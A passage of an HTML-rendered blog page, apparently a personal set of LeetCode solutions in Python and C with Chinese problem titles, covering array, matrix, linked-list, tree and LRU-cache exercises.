class="keyword">if</span> len(path)==len(nums):</span><br><span class="line">                res.append(path[:])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> choice:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> path:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                path.append(i)</span><br><span class="line">                trace(path,choice)</span><br><span class="line">                path.pop()</span><br><span class="line">        trace([],nums)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="最大子序和-easy"><a href="#最大子序和-easy" class="headerlink" title="最大子序和(easy)"></a>最大子序和(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            nums[i] = nums[i]+max(nums[i<span class="number">-1</span>],<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> max(nums)</span><br></pre></td></tr></table></figure><h4 id="螺旋矩阵-medium"><a href="#螺旋矩阵-medium" class="headerlink" title="螺旋矩阵(medium)"></a>螺旋矩阵(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiralOrder</span><span class="params">(self, matrix)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type matrix: List[List[int]]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=[]</span><br><span class="line">        <span class="keyword">while</span> len(matrix)!=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> matrix[<span class="number">0</span>]:</span><br><span class="line">                res.append(i)</span><br><span class="line">            matrix.pop(<span class="number">0</span>)</span><br><span class="line">            matrix=list(zip(*matrix))</span><br><span class="line">            matrix.reverse()</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="螺旋矩阵II-medium"><a href="#螺旋矩阵II-medium" class="headerlink" title="螺旋矩阵II(medium)"></a>螺旋矩阵II(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generateMatrix</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> [[<span class="number">1</span>]]</span><br><span class="line">        res=[[n*n<span class="number">-1</span>],[n*n]]</span><br><span class="line">        i=n*n<span class="number">-2</span></span><br><span class="line">        <span class="keyword">while</span> i&gt;=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                res[j].insert(<span class="number">0</span>,i)</span><br><span class="line">                i-=<span class="number">1</span></span><br><span class="line">            res=list(map(list,zip(*res)))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">                j.reverse()</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="旋转链表-medium"><a href="#旋转链表-medium" class="headerlink" title="旋转链表(medium)"></a>旋转链表(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotateRight</span><span class="params">(self, head, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        node=head</span><br><span class="line">        count=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> node!=<span class="literal">None</span>:</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">            pre=node</span><br><span class="line">            node=node.next</span><br><span class="line">        s=k%count</span><br><span class="line">        t=count-s</span><br><span class="line">        pre.next=head</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(t):</span><br><span class="line">            prenode=head</span><br><span class="line">            head=head.next</span><br><span class="line">        prenode.next=<span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure><h4 id="不同路径-medium"><a href="#不同路径-medium" class="headerlink" title="不同路径(medium)"></a>不同路径(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uniquePaths</span><span class="params">(self, m, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=[[<span class="number">1</span>]*n]*m</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">                res[i][j]=res[i][j<span class="number">-1</span>]+res[i<span class="number">-1</span>][j]</span><br><span class="line">        <span class="keyword">return</span> res[<span class="number">-1</span>][<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h4 id="爬楼梯-easy"><a href="#爬楼梯-easy" class="headerlink" title="爬楼梯(easy)"></a>爬楼梯(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-3</span>):</span><br><span class="line">            res.append(res[<span class="number">-1</span>]+res[<span class="number">-2</span>])</span><br><span class="line">        <span class="keyword">return</span> res[n<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h4 id="子集-medium"><a href="#子集-medium" class="headerlink" title="子集(medium)"></a>子集(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subsets</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=[[]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            res+=[j+[i] <span class="keyword">for</span> j <span class="keyword">in</span> res]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="合并两个有序数组-easy"><a href="#合并两个有序数组-easy" class="headerlink" title="合并两个有序数组(easy)"></a>合并两个有序数组(easy)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = m - <span class="number">1</span>,j = n - <span class="number">1</span>,k = m + n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1[i] &gt; nums2[j])</span><br><span class="line">            nums1[k--] = nums1[i--];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            nums1[k--] = nums2[j--];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &gt;= <span class="number">0</span>)</span><br><span class="line">        nums1[k--] = nums2[j--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="格雷编码-medium"><a href="#格雷编码-medium" class="headerlink" title="格雷编码(medium)"></a>格雷编码(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">grayCode</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#先右移再异或</span></span><br><span class="line">        res=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**n):</span><br><span class="line">            res.append(i^i&gt;&gt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="二叉树的最大深度-easy"><a href="#二叉树的最大深度-easy" class="headerlink" title="二叉树的最大深度(easy)"></a>二叉树的最大深度(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> max(self.maxDepth(root.left),self.maxDepth(root.right))+<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="买卖股票的最佳时机-easy"><a href="#买卖股票的最佳时机-easy" class="headerlink" title="买卖股票的最佳时机(easy)"></a>买卖股票的最佳时机(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># max_num=0</span></span><br><span class="line">        <span class="comment"># if len(prices)==0:</span></span><br><span class="line">        <span class="comment">#     return 0</span></span><br><span class="line">        <span class="comment"># for i in range(1,len(prices)):</span></span><br><span class="line">        <span class="comment">#     if prices[i]-min(prices[:i])&gt;max_num:</span></span><br><span class="line">        <span class="comment">#         max_num = prices[i]-min(prices[:i])</span></span><br><span class="line">        <span class="comment"># return max_num</span></span><br><span class="line"></span><br><span class="line">        max_num=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(prices)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        min_num=prices[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(prices)):</span><br><span class="line">            min_num = min(min_num,prices[i<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">if</span> prices[i]-min_num&gt;max_num:</span><br><span class="line">                max_num = prices[i]-min_num</span><br><span class="line">        <span class="keyword">return</span> max_num</span><br></pre></td></tr></table></figure><h4 id="买卖股票的最佳时机II-easy"><a href="#买卖股票的最佳时机II-easy" class="headerlink" title="买卖股票的最佳时机II(easy)"></a>买卖股票的最佳时机II(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        sum=<span class="number">0</span></span><br><span class="line">        res=[]</span><br><span class="line">        temp=[]</span><br><span class="line">        <span class="comment">#这段用来分割连续增加的点</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(prices)):</span><br><span class="line">            <span class="keyword">if</span> prices[i]&lt;prices[i<span class="number">-1</span>]:</span><br><span class="line">                temp.append(i)</span><br><span class="line">        <span class="keyword">if</span> len(prices) <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">            temp.append(len(prices))</span><br><span class="line">        temp.insert(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#这段用来将每个连续增加段存入res</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(temp)):</span><br><span class="line">            res.append(prices[temp[i<span class="number">-1</span>]:temp[i]])</span><br><span class="line">        <span class="comment">#计算每个段中最大值和最小值并累加</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">if</span> len(i)&gt;=<span class="number">2</span>:</span><br><span class="line">                sum+=(max(i)-min(i))</span><br><span class="line">        <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure><h4 id="二叉树的最大路径和-hard"><a href="#二叉树的最大路径和-hard" class="headerlink" title="二叉树的最大路径和(hard)"></a>二叉树的最大路径和(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="只出现一次的数字-easy"><a href="#只出现一次的数字-easy" class="headerlink" title="只出现一次的数字(easy)"></a>只出现一次的数字(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        a = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            a = a ^ num</span><br><span class="line">        <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h4 id="环形链表-easy"><a href="#环形链表-easy" class="headerlink" title="环形链表(easy)"></a>环形链表(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span> <span class="keyword">or</span> head.next==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        p=head</span><br><span class="line">        q=head.next</span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            <span class="keyword">if</span> q.next==p:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> q.next==<span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> q.next.next==<span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                p=p.next</span><br><span class="line">                q=q.next.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="环形链表II-medium"><a href="#环形链表II-medium" class="headerlink" title="环形链表II(medium)"></a>环形链表II(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detectCycle</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=[]</span><br><span class="line">        node=head</span><br><span class="line">        <span class="keyword">while</span> node!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> node.next <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                res.append(node)</span><br><span class="line">                node=node.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> node.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h4 id="LRU缓存机制-medium"><a href="#LRU缓存机制-medium" class="headerlink" title="LRU缓存机制(medium)"></a>LRU缓存机制(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type capacity: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.capacity = capacity</span><br><span class="line">        self.d = collections.OrderedDict()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> self.d:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        res = self.d[key]</span><br><span class="line">        self.d.pop(key)</span><br><span class="line">        self.d[key]= res</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key, value)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :type value: int</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> self.d:</span><br><span class="line">            <span class="keyword">if</span> self.capacity &lt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> self.d.keys():</span><br><span class="line">                    self.d.pop(k)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.capacity-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.d.pop(key)</span><br><span class="line">        self.d[key]=value</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = LRUCache(capacity)</span></span><br><span class="line"><span class="comment"># param_1 = obj.get(key)</span></span><br><span class="line"><span class="comment"># obj.put(key,value)</span></span><br></pre></td></tr></table></figure><h4 id="排序链表-medium"><a href="#排序链表-medium" class="headerlink" title="排序链表(medium)"></a>排序链表(medium)</h4><figure class="highlight 